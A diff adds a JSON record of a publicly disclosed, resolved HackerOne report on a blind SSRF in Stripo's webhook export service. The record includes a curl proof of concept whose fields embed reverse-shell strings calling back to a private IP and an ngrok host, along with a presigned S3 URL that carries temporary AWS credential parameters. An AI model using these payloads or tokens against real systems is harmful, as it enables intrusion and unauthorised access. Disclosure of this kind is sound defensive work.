@@ -1,0 +1,121 @@
+{
+  "id": 2932960,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTMyOTYw",
+  "url": "https://hackerone.com/reports/2932960",
+  "title": "[my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2025-01-13T00:09:55.340Z",
+  "submitted_at": "2025-01-13T00:09:55.552Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "odaysec",
+    "url": "/odaysec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/cqjxx3wbhejfzvl1dwusepkdthvr/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 42368,
+    "url": "https://hackerone.com/stripo",
+    "handle": "stripo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Stripo Inc",
+      "twitter_handle": "",
+      "website": "https://stripo.email",
+      "about": "Stripo is a lightweight and intuitive email template editor that lets users build professional looking and highly responsive email templates."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-12-01T08:22:34.107Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-04-23T10:05:02.425Z",
+  "team_member_agreed_on_going_public_at": "2025-12-01T08:22:33.821Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Introduction Vulnerability Overview\nThis presentation covers a critical Blind SSRF (Server-Side Request Forgery) vulnerability identified in Stripo's export service. SSRF vulnerabilities allow attackers to manipulate a server to make arbitrary requests to internal or external systems, potentially leading to severe security breaches. The vulnerability exists in the endpoint `/exportservice/v3/exports/WEBHOOK/accounts`. By providing malicious input in the `webhookUrl` parameter, an attacker can trigger SSRF, allowing the server to make unauthorized HTTP requests to attacker-controlled systems.\n\n## Exploitation Details\n\n### Proof of Concept (PoC)\nThe following `curl` command demonstrates the vulnerability exploitation:\nhttps://my.stripo.email/editor/v5/1529528/email/8891640\n```bash\ncurl -i -X POST 'https://my.stripo.email/bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412' \\\n--data '{\n  \"id\": 52027412,\n  \"name\": \"sh -i & devtcp192.168.100.3 0&1\",\n  \"oAuthRequired\": false,\n  \"authLink\": null,\n  \"draft\": false,\n  \"destination\": \"WEBHOOK\",\n  \"properties\": {\n    \"headers\": [\n      {\n        \"name\": \"sh -i >& /dev/tcp/192.168.100.3/9001 0>&1\",\n        \"value\": \"sh -i >& /dev/tcp/192.168.100.3/9001 0>&1\"\n      }\n    ],\n    \"accountName\": \"sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1\",\n    \"webhookUrl\": \"https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1\",\n    \"webhookType\": \"CUSTOM\"\n  },\n  \"public\": false\n}'\n```\nResulting HTTP Request\nWhen processed, the application generates the following HTTP request to the specified `webhookUrl`:\n```\nPOST /webhook/sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.3%2F9001%200%3E%261/ HTTP/1.1\nHost: 5290-101-255-157-9.ngrok-free.app\nUser-Agent: Apache-HttpClient/4.5.14 (Java/21.0.5)\nContent-Length: 104\nAccept: application/json\nAccept-Encoding: gzip,deflate\nTraceparent: 00-58ae5f178436f516dfed5bcabe66e0a4-6f1c4d73cae918b9-00\nX-Forwarded-For: 54.247.167.106\nX-Forwarded-Host: 5290-101-255-157-9.ngrok-free.app\nX-Forwarded-Proto: https\n```\nHTTP Request via Burp Suite\n```\nPOST /bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412 HTTP/1.1\nHost: my.stripo.email\nContent-Type: application/json\nContent-Length: 457\n\n{\n  \"id\": 52027412,\n  \"name\": \"sh -i & devtcp192.168.100.3 0&1\",\n  \"oAuthRequired\": false,\n  \"authLink\": null,\n  \"draft\": false,\n  \"destination\": \"WEBHOOK\",\n  \"properties\": {\n    \"headers\": [\n      {\n        \"name\": \"sh -i >& /dev/tcp/192.168.100.3/9001 0>&1\",\n        \"value\": \"sh -i >& /dev/tcp/192.168.100.3/9001 0>&1\"\n      }\n    ],\n    \"accountName\": \"sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1\",\n    \"webhookUrl\": \"https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1\",\n    \"webhookType\": \"CUSTOM\"\n  },\n  \"public\": false\n}\n```\n**Payload:**\n```js\n{\n  \"id\": 52027412,\n  \"name\": \"sh -i & devtcp192.168.100.3 0&1\",\n  \"oAuthRequired\": false,\n  \"authLink\": null,\n  \"draft\": false,\n  \"destination\": \"WEBHOOK\",\n  \"properties\": {\n    \"headers\": [\n      {\n        \"name\": \"sh -i >& /dev/tcp/192.168.100.3/9001 0>&1\",\n        \"value\": \"sh -i >& /dev/tcp/192.168.100.3/9001 0>&1\"\n      }\n    ],\n    \"accountName\": \"sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1\",\n    \"webhookUrl\": \"https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1\",\n    \"webhookType\": \"CUSTOM\"\n  },\n  \"public\": false\n}\n```\n{F3939737}\n\n## Impact\n\n**Data Exfiltration**:\n  - Attackers can leverage SSRF to access sensitive internal network data, such as cloud metadata, internal API endpoints, or other restricted services.  `port-scan`\n  - Missing Endpoints Export Email Message to Zapier\n  - Control character allowed in Export Email Message to Zapier\n  - URL Not have filthered as `webhook/email.tar.gz`\n  - Internal Resource Access: Blind SSRF allows accessing internal services or endpoints, bypassing network restrictions.\n  - Chained Attacks: It could lead to advanced exploitation, such as retrieving sensitive metadata or executing remote commands.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3939737,
+      "file_name": "StripoPOC.mkv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/212f8y2jw12nnpeaqq9kzdm3nvjz?response-content-disposition=attachment%3B%20filename%3D%22StripoPOC.mkv%22%3B%20filename%2A%3DUTF-8%27%27StripoPOC.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRJBVZR2L%2F20251201%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20251201T090507Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDEaCXVzLXdlc3QtMiJGMEQCIBt1mfXOXwsQ4mR7NU%2FaY%2BKcJb2ICPG%2BqLKOtBPbdFdGAiAnKTpkStP9zxQ0g0TkjzxYMpvqppnwoSZ67XkZxDgoniq6BQj5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMndKTrfByXP1Jw0mZKo4F33VZR9wnxWLettD3Di3RcmJEwehq0YX1HXABjna3PCsKUW4H2ZSYX8AwtI2JKzpecKsVeq8EkooJxWNxW4eNbOShshJJj0t1%2F%2Fz585s5NFXHC%2FIUNpmxx8T0Tp0UyddQFt%2F%2FlZ6I%2FLxm9riJRQTFTsfQFzCvcL5rW%2Fz7WrqsL6DAA4iTBYicx%2Bvvom7udiTvEloFbT3Q7ttaiJlEzkcDIdOHIF2KJ16VsQ5af4ecO%2BKsWaVuVoPNJSJsxTQNTEwBo200CRTXr9UTVQbo%2FVqhgnWXpUs9HfY6laFCo8tvr0762uOqFEcOH4imyvhwaIo%2BPYbL0%2BjTJRDzceJaVilWisoUwZc5VYbhZF1uXn7iuOGRyLH6oX0zx7BcMi0LIY7Ve3Ea3AnAaOsBpFgozAO6gzw960PfIFsnqEL9X8RC%2Bf%2FQK8UOyPzg6F22U3Dm90B8YdBKkqklOhQt9PVAYoUH9VymZvl3zgzy4Dquul8j8q6KFLmVZG2wUnw61P9kvEcG1N1tYr6zBW5zrSyqG6tnW3HqIDy4suVXQ0imz9vGsbr5awtBvaO0m4kjQb5gjedDIvefjSv6Fircc8hXrDH8mueaUmKIbjolUqmlPlPi2uZTUKAcnG12FyBnhq%2FcdlGnlsTom8udyNqnGUb1%2BAQXHRO%2BY38a5a3v6wXiy3xlYYh2mZ%2B40bP%2BLOQ61GUqqtkPNPElKbIkaDw3DUh32rraGeC9V0C3v7m23T7ljD7lwOO5yqLN4GJPfdsy1QhThBCyC1jeQ82ifOp6GDCm9Io92loIdCsRLRRSAzZcjBXOs0NFH%2Fgzrpx1uPt5wZJ3t3A7X676XbLyrpb5jYuwuWmknP%2Bv%2FozIZ3Yulrh%2FjgOLMP2etckGOrIBhfWANeva9c3ZeJguSHGju5cav37frSXXWTQpVhqKAKelu3Ee%2Fbt%2Bna%2FfUkyyX2FJJfcLKOo1D5mK9nu8LUDG%2B9snRig8MgJSu2QvUKOj8yuJkobuMH%2FcAmPxEfdJvsTUjD6kk7j6%2BU4bnytptxoNhLLgQnPCnizUUTexjDkfSVnlHMfX1AXK%2BGaSbuGmR%2FjZEmtz9Iogknu7ht%2FXPRHyR6GyeTkmzY8cPRSSlcM5kqZXBQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cfbbe5d5faf16363d8d8766a2bd240a9c81170341740f2853c6697de28a0caad",
+      "file_size": 1344746,
+      "type": "video/x-matroska",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 2,
+  "voters": [
+    "rehan-mirjat",
+    "zdg0x0"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 38702,
+    "asset_type": "URL",
+    "asset_identifier": "my.stripo.email",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
